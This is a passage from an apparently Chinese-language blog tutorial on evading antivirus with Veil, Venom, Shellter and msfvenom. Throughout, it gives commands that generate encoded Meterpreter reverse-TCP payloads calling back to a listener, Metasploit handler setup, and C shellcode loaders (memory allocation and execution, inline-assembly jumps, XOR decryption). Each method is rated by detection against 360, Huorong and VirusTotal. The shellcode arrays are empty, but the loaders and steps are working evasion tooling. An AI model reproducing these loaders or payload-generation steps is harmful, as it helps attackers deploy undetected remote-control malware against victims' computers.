class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Veil&gt;: use 1                   #选择Evasion功能</span><br><span class="line">Veil/Evasion&gt;: list            #查看payload列表</span><br></pre></td></tr></table></figure><p>使用<code>list</code>可以看到到41种stager。</p><p><img src="/./images/202205270946813.png" alt="image-20220527094613602"></p><p>推荐使用以go和ruby语言encode的编码方式。像python这类的与用户有较高的交互就容易被查杀。</p><p>veil原理可以参考：<a href="https://xz.aliyun.com/t/4191">https://xz.aliyun.com/t/4191</a></p><h3 id="使用veil直接生成exe-VT查杀率44-69"><a href="#使用veil直接生成exe-VT查杀率44-69" class="headerlink" title="使用veil直接生成exe(VT查杀率44&#x2F;69)"></a>使用veil直接生成exe(VT查杀率44&#x2F;69)</h3><p>veil可以直接生成支持msf的payload，我们先试一下看看效果。</p><p>使用go语言生成msf的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Veil/Evasion&gt;: use 16</span><br></pre></td></tr></table></figure><p>设置好msf的监听主机和端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[go/meterpreter/rev_tcp&gt;&gt;]: set lhost 192.168.174.128</span><br><span class="line">[go/meterpreter/rev_tcp&gt;&gt;]: set lport 6666</span><br><span class="line">[go/meterpreter/rev_tcp&gt;&gt;]: generate</span><br></pre></td></tr></table></figure><p><img src="/./images/202205270959676.png" alt="image-20220527095925448"></p><p>设定好生成的payload的名称，例如payload1：</p><p><img src="/./images/202205270950182.png" alt="image-20220527094916300"></p><p>一系列编码编译之后，就生成payload了：</p><p><img src="/./images/202205270950223.png" alt="image-20220527095021088"></p><p>因为之前已经做过Docker目录映射，所以在宿主机的<code>/tmp/veil-output/compiled/</code>目录可直接看到生成的exe文件。</p><p>在msf中监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.174.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure><p>在测试主机执行<code>payload1.exe</code>，360和火绒均可以查杀（原po在msf中可上线，360和火绒均不报毒）。</p><p>在virustotal.com上查杀率为44&#x2F;69（原po为44&#x2F;71）。</p><p>360：</p><p><img src="/./images/202205271002159.png" alt="image-20220527100249086"></p><p>火绒：</p><p><img src="/./images/202205271011302.png" alt="image-20220527101107223"></p><p>VT：</p><p><img src="/./images/202205271013133.png" alt="image-20220527101335024"></p><h3 id="使用veil-mingw-w64-VT查杀率11-69"><a href="#使用veil-mingw-w64-VT查杀率11-69" class="headerlink" title="使用veil+mingw-w64(VT查杀率11&#x2F;69)"></a>使用veil+mingw-w64(VT查杀率11&#x2F;69)</h3><p>先用veil生成shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># veil</span><br><span class="line">Veil&gt; use 1# 选择使用 Veil-Evasion 模块</span><br><span class="line">Veil/Evasion&gt; use 7# 选择payload  c/meterpreter/rev_tcp.py</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.174.128</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] set LPORT 6666</span><br><span class="line">[cs/meterpreter/rev_tcp&gt;&gt;] generate</span><br></pre></td></tr></table></figure><p><img src="/./images/202205271016580.png" alt="image-20220527101615402"></p><p>输入生成文件名为<code>c_msf</code>：</p><p><img src="/./images/202205271016611.png" alt="image-20220527101633513"></p><p>先生成一个可以被 msf 利用的 <code>c_msf.c</code> 然后用mingw-w64 来编译。</p><p>mingw-w64的安装可参考：<a href="https://zhuanlan.zhihu.com/p/76613134">https://zhuanlan.zhihu.com/p/76613134</a></p><p>若编译报错，可以尝试指定库，生成可执行文件a.exe：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc c_msf.c -lws2_32</span><br></pre></td></tr></table></figure><p><img src="/./images/202205271121046.png" alt="image-20220527112104971"></p><p>360和火绒均可以查杀（原po全程开启360卫士和杀毒以及火绒，编译、运行、上线都没有问题）。</p><p>在virustotal.com上查杀率为11&#x2F;69（原po为23&#x2F;71）。Bypass了McAfee。</p><p>360：</p><p><img src="/./images/202205271124553.png" alt="image-20220527112426483"></p><p>火绒：</p><p><img src="/./images/202205271122178.png" alt="image-20220527112257096"></p><p>VT：</p><p><img src="/./images/202205271126466.png" alt="image-20220527112633347"></p><h2 id="Venom免杀"><a href="#Venom免杀" class="headerlink" title="Venom免杀"></a>Venom免杀</h2><p>Venom利用msfvenom（metasploit）生成不同的格式的shellcode，如（c | python | ruby | dll | msi | hta-psh）等，然后将生成的shellcode注入一个模板（例如：python），并使用类似gcc、mingw32或pyinstaller之类的编译器生成可执行文件。</p><p>Venom的一些功能还会直接调用<code>Veil-Evasion.py</code>，<code>unicorn.py</code>，<code>powersploit.py</code>等来直接创建免杀程序，避免重复造轮子。</p><h3 id="安装Venom"><a href="#安装Venom" class="headerlink" title="安装Venom"></a>安装Venom</h3><p>venom安装和运行必须是在图形界面下，如果是ssh终端连接到kali进行连接是不行的。venom依赖的软件比较多，所以安装出现问题是很正常的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Zenity | Metasploit | GCC (compiler) | Pyinstaller (compiler)</span><br><span class="line">mingw32 (compiler) | pyherion.py (crypter) | wine (emulator)</span><br><span class="line">PEScrambler.exe (PE obfuscator) | apache2 (webserver)| winrar (wine)</span><br><span class="line">vbs-obfuscator (obfuscator) | avet (Daniel Sauder) | shellter (KyRecon)</span><br><span class="line">ettercap (MitM + DNS_Spoofing) | encrypt_PolarSSL (AES crypter)</span><br></pre></td></tr></table></figure><p>从github上拖到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/r00t-3xp10it/venom.git</span><br></pre></td></tr></table></figure><p>修改文件执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd venom</span><br><span class="line">sudo chmod -R +x *.sh</span><br><span class="line">sudo chmod -R +x *.py</span><br></pre></td></tr></table></figure><p>安装依赖库和软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd aux</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure><p>运行venom，代码高亮有些问题，但是问题不大，还是可以用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./venom.sh</span><br></pre></td></tr></table></figure><p><img src="/./images/202205271736471.png" alt="image-20220527173623380"></p><h3 id="venom生成exe-VT查杀率35-68"><a href="#venom生成exe-VT查杀率35-68" class="headerlink" title="venom生成exe(VT查杀率35&#x2F;68)"></a>venom生成exe(VT查杀率35&#x2F;68)</h3><p>启动venom:<code>sudo ./venom.sh</code>，然后选择windows，也就是2，然后会列出所有windows可用的20个agent。</p><p><img src="/./images/202205271737599.png" alt="image-20220527173757520"></p><p>支持的种类还是比较全面的，shellter、avet等免杀工具都内置在里面了，而且支持很多种类似的payload格式。</p><p>先生成一个最简单直接的，第4个模块，通过C编译EXE程序。</p><p>在输入4之后，会弹出一个框让你输入ip地址，这个就是你msf监听主机的地址：</p><p><img src="/./images/202205271739076.png" alt="image-20220527173929002"></p><p>然后输入端口号之后，选择payload，选择最常规的<code>windows/meterperter/reverse_tcp</code>。</p><p>输入一个文件名，例如notepad。</p><p><img src="/./images/202205271740284.png" alt="image-20220527174056207"></p><p>然后在编译和生成exe的过程中，会弹出来两个选项框，一般默认就行。</p><p>之后会提示已经生成，并询问你如何分发payload，直接在测试机上执行就行了，可见output文件夹已经生成了notepad.exe。</p><p><img src="/./images/202205271742310.png" alt="image-20220527174259258"></p><p>360和火绒均可以查杀（原po360静态检测没问题，但行为检测能查杀出为病毒；火绒则静态+动态都没有检测到）。</p><p>在virustotal.com上查杀率为35&#x2F;68（原po为19&#x2F;71）。</p><p>360：</p><p><img src="/./images/202205271800602.png" alt="image-20220527180055539"></p><p>火绒：</p><p><img src="/./images/202205271801624.png" alt="image-20220527180138530"></p><p>VT：</p><p><img src="/./images/202205271804004.png" alt="image-20220527180452891"></p><h3 id="venom生成dll-VT查杀率11-70"><a href="#venom生成dll-VT查杀率11-70" class="headerlink" title="venom生成dll(VT查杀率11&#x2F;70)"></a>venom生成dll(VT查杀率11&#x2F;70)</h3><p>选择windows之后，在agent中选择第1个，生成dll。</p><p><img src="/./images/202205271807146.png" alt="image-20220527180740091"></p><p>后面的操作和上面那个差不多，然后就能看到生成了<code>notepad.dll</code>文件。</p><p>原po将文件拷贝到测试机上，命令行中执行<code>rundll32.exe notepad.dll,main</code>，可动静态免杀过360和火绒。msf正常上线。在virustotal.com上查杀率为11&#x2F;71。</p><p>本文复现时出现问题：</p><p><img src="/./images/202205271815246.png" alt="image-20220527181539179"></p><h2 id="Shellter免杀"><a href="#Shellter免杀" class="headerlink" title="Shellter免杀"></a>Shellter免杀</h2><p>注意：</p><ul><li>shellter目前只能注入32位的可执行文件</li><li>shellter需要管理员权限运行</li></ul><h3 id="安装Shellter"><a href="#安装Shellter" class="headerlink" title="安装Shellter"></a>安装Shellter</h3><p>ubuntu系统中apt安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install shellter</span><br><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span><br></pre></td></tr></table></figure><p>kali中不是很好用，windows中手动下载手动下载：</p><p>官方下载站点<code>https://www.shellterproject.com/download/</code>，下载后解压，无需安装，cmd下可直接使用。</p><p><img src="/./images/202205271824223.png" alt="image-20220527182416161"></p><h3 id="生成payload（VT免杀率7-69"><a href="#生成payload（VT免杀率7-69" class="headerlink" title="生成payload（VT免杀率7&#x2F;69)"></a>生成payload（VT免杀率7&#x2F;69)</h3><p>需要提前准备一个PE文件作为被注入程序。用之前选的<code>putty.exe</code>来进行测试。</p><p>必须使用32位PE文件，下载一个32位putty.exe：</p><p><img src="/./images/202205271827287.png" alt="image-20220527182755237"></p><p>之后程序会把<code>putty.exe</code>进行备份，因为生成的payload会自动覆盖原来的<code>putty.exe</code>。</p><p>但<code>putty-32.exe</code>生成报错，换了一个32位可执行文件<code>winrar.exe</code>：</p><p><img src="/./images/202205271850186.png" alt="image-20220527185054107"></p><p>选项<code>Enable Stealth Mode</code>，是否启用隐身模式，启用后免杀效果会变差，建议不启用。</p><p>还是选择<code>windows/meterpreter/reverse_tcp</code>作为payload</p><p><img src="/./images/202205271852105.png" alt="image-20220527185214043"></p><p>全程自动化生成，最终的生成文件会替换原来的<code>winrar.exe</code>。</p><p>通过对比可发现程序稍微变大了</p><p>在msf中使用<code>handler -H 192.168.174.128 -P 6666 -p windows/meterpreter/reverse_tcp</code>进行监听</p><p>360和火绒均可查杀（原po执行360和火绒均可免杀，msf正常上线）。</p><p>在virustotal.com上查杀率为12&#x2F;65，Bypass了卡巴、瑞星（原po为7&#x2F;69，卡巴、瑞星、微软三个都没bypass）。</p><p>360：</p><p><img src="/./images/202205271854112.png" alt="image-20220527185452045"></p><p>火绒：</p><p><img src="/./images/202205271856578.png"></p><p>VT：</p><p><img src="/./images/202205271902073.png" alt="image-20220527190242985"></p><h2 id="C、C-加载shellcode"><a href="#C、C-加载shellcode" class="headerlink" title="C、C++加载shellcode"></a>C、C++加载shellcode</h2><p>以上很多方法都是使用msfvenom生成shellcode，然后对shellcode进行混淆、编码等各种处理，最终再使用各种语言进行编译或加载。而被用到的最多的语言就是C&#x2F;C++、C#和python。</p><p>C&#x2F;C++加载shellcode手工编译的方法，一般分为两种方式：</p><ol><li><p>C&#x2F;C++源码+shellcode直接编译，其中对shellcode的执行可以使用函数指针执行、汇编指令执行、申请动态内存等方式，且shellcode可进行一些加密混淆处理；比如免杀工具veil和Venom都是使用了类似的方法。</p></li><li><p>使用加载器加载C&#x2F;C++代码，如shellcode_launcher之类。</p></li></ol><h3 id="方法1-msf直接生成exe（VT免杀率51-69）"><a href="#方法1-msf直接生成exe（VT免杀率51-69）" class="headerlink" title="方法1 msf直接生成exe（VT免杀率51&#x2F;69）"></a>方法1 msf直接生成exe（VT免杀率51&#x2F;69）</h3><p>这是最简单的一种加载shellcode的方法，直接使用msfvenom生成c语言的shellcode，为了提高免杀效果，使用了<code>shikata_ga_nai</code>编码器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.174.128 lport=6666  -f exe -o shellcode1.exe</span><br></pre></td></tr></table></figure><p><img src="/./images/202205301154200.png" alt="image-20220530115440059"></p><p>在msf中进行监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use multi/handler</span><br><span class="line">msf6 &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 &gt; set LHOST 192.168.174.128</span><br><span class="line">msf6 &gt; set LPORT 6666</span><br><span class="line">msf6 &gt; set EnableStageEncoding true</span><br></pre></td></tr></table></figure><p>然后执行生成的<code>shellcode1.exe</code>，msf中可正常上线：</p><p><img src="/./images/202205301154538.png" alt="image-20220530115427316"></p><p>360和火绒均可查杀，在virustotal.com上查杀率为51&#x2F;69。</p><p>360：</p><p><img src="/./images/202205301155110.png" alt="image-20220530115531047"></p><p>火绒：</p><p><img src="/./images/202205301156409.png" alt="image-20220530115635342"></p><p>VT：</p><p><img src="/./images/202205301157438.png" alt="image-20220530115749310"></p><h3 id="方法2-申请动态内存加载（VT免杀率36-69）"><a href="#方法2-申请动态内存加载（VT免杀率36-69）" class="headerlink" title="方法2 申请动态内存加载（VT免杀率36&#x2F;69）"></a>方法2 申请动态内存加载（VT免杀率36&#x2F;69）</h3><p>下面的代码会申请一段动态内存，然后加载shellcode。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//windows控制台程序不出黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 原po此处内存报错，已修改</span></span><br><span class="line">    LPVOID Memory;</span><br><span class="line"></span><br><span class="line">    Memory=VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>visual studio 2019进行编译，关闭杀软，msf中可正常上线：</p><p><img src="/./images/202205301349630.png" alt="image-20220530134959565"></p><p>打开杀软，360和火绒均可查杀（原po火绒静态和动态都可查杀，360杀毒和卫士没有反应）。</p><p>virustotal.com上查杀率为36&#x2F;69（原po为24&#x2F;71）。</p><p>受控机没有C环境，执行时缺少<code>VCRUNTIME140D.dll</code>和<code>ucrtbased.dll</code>，需要手动安装。</p><p><img src="/./images/202205301354403.png" alt="image-20220530135423356"></p><p>360：</p><p><img src="/./images/202205301355884.png" alt="image-20220530135541816"></p><p>火绒：</p><p><img src="/./images/202205301352552.png" alt="image-20220530135217482"></p><p>VT：</p><p><img src="/./images/202205301400718.png" alt="image-20220530140029621"></p><h3 id="方法3-嵌入汇编加载（VT免杀率36-69）"><a href="#方法3-嵌入汇编加载（VT免杀率36-69）" class="headerlink" title="方法3 嵌入汇编加载（VT免杀率36&#x2F;69）"></a>方法3 嵌入汇编加载（VT免杀率36&#x2F;69）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        __asm</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在vs2019中编译执行，关闭杀软，msf中可正常上线。</p><p>打开杀软，火绒和360均可查杀（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。</p><p>virustotal.com上查杀率为36&#x2F;69（原po为12&#x2F;71）。</p><p>360：</p><p><img src="/./images/202205301413445.png" alt="image-20220530141332388"></p><p>火绒：</p><p><img src="/./images/202205301414456.png" alt="image-20220530141410368"></p><p>VT：</p><p><img src="/./images/202205301417844.png" alt="image-20220530141716720"></p><h3 id="方法4-强制类型转换（VT免杀率34-68）"><a href="#方法4-强制类型转换（VT免杀率34-68）" class="headerlink" title="方法4 强制类型转换（VT免杀率34&#x2F;68）"></a>方法4 强制类型转换（VT免杀率34&#x2F;68）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">   ((void(WINAPI*)(void))&amp;shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开杀软测试，360和火绒均可查杀，但360是在上线后几分钟后才检测出来的（原po静态+动态都没问题，可正常上线）。</p><p>virustotal.com上查杀率为34&#x2F;68（原po为9&#x2F;70）。</p><p><img src="/./images/202205301425472.png" alt="image-20220530142524357"></p><h3 id="方法5-汇编花指令-VT免杀率37-69"><a href="#方法5-汇编花指令-VT免杀率37-69" class="headerlink" title="方法5 汇编花指令(VT免杀率37&#x2F;69)"></a>方法5 汇编花指令(VT免杀率37&#x2F;69)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        _emit <span class="number">0xFF</span>  </span><br><span class="line">        _emit <span class="number">0xE0</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开杀软，火绒可查杀，<strong>360不可查杀</strong>（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。</p><p>virustotal.com上查杀率为37&#x2F;69（原po为12&#x2F;69）。</p><p><img src="/./images/202205301430315.png" alt="image-20220530143025208"></p><h3 id="方法6-xor加密（VT免杀率21-69）"><a href="#方法6-xor加密（VT免杀率21-69）" class="headerlink" title="方法6 xor加密（VT免杀率21&#x2F;69）"></a>方法6 xor加密（VT免杀率21&#x2F;69）</h3><p>需要使用一个工具<code>https://github.com/Arno0x/ShellcodeWrapper</code>，原项目为python2，在此基础上修改了一个python3版本<a href="https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/ShellcodeWrapper">ShellcodeWrapper</a>。</p><p>先用msfvenom生成一个raw格式的shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.174.128 lport=6666  -f raw &gt; shellcode.raw</span><br></pre></td></tr></table></figure><p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>threekiii</code>为自己设置的key。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shellcode_encoder.py -cpp -cs -py shellcode.raw threekiii xor</span><br></pre></td></tr></table></figure><p>生成了三个文件，一个为C++源码，也是下面要用到的，一个为C#源码，可以使用csc.exe进行加载，还有一个py文件，可直接执行也可以编译成py-exe执行。</p><p><img src="/./images/202205301450337.png" alt="image-20220530145037208"></p><p>其中<code>encryptedShellcodeWrapper_xor.cpp</code>文件中的C++源码如下，稍作修改，删除依赖库：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Author: Arno0x0x, Twitter: @Arno0x0x</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除#include &quot;stdafx.h&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Encrypted shellcode and cipher key obtained from shellcode_encoder.py</span></span><br><span class="line">    <span class="type">char</span> encryptedShellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;tidesec&quot;</span>;</span><br><span class="line">    <span class="type">char</span> cipherType[] = <span class="string">&quot;xor&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Char array to host the deciphered shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode[<span class="keyword">sizeof</span> encryptedShellcode];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// XOR decoding stub using the key defined above must be the same as the encoding key</span></span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> encryptedShellcode; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="keyword">sizeof</span> key - <span class="number">1</span>) j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        shellcode[i] = encryptedShellcode[i] ^ key[j];</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocating memory with EXECUTE writes</span></span><br><span class="line">    <span class="type">void</span> *exec = VirtualAlloc(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copying deciphered shellcode into memory as a function</span></span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the shellcode</span></span><br><span class="line">    ((<span class="type">void</span>(*)())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vs2019编译执行，关闭杀软，msf中可正常上线：</p><p><img src="/./images/202205301453694.png" alt="image-20220530145307544"></p><p>打开杀软，360和火绒均可查杀，其中360结果为“具有木马特征程序”（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。</p><p>virustotal.com上查杀率为21&#x2F;69（原po为15&#x2F;71）。</p><p>360：</p><p><img src="/./images/202205301454631.png" alt="image-20220530145415574"></p><p>VT：</p><p><img src="/./images/202205301456618.png" alt="image-20220530145657512"></p><h3 id="方法7-base64加密1（VT免杀率21-68）"><a href="#方法7-base64加密1（VT免杀率21-68）" class="headerlink" title="方法7 base64加密1（VT免杀率21&#x2F;68）"></a>方法7 base64加密1（VT免杀率21&#x2F;68）</h3><p>需要两个文件，<code>base64.c</code>和<code>base64.h</code></p><p><code>base64.c</code>文件内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 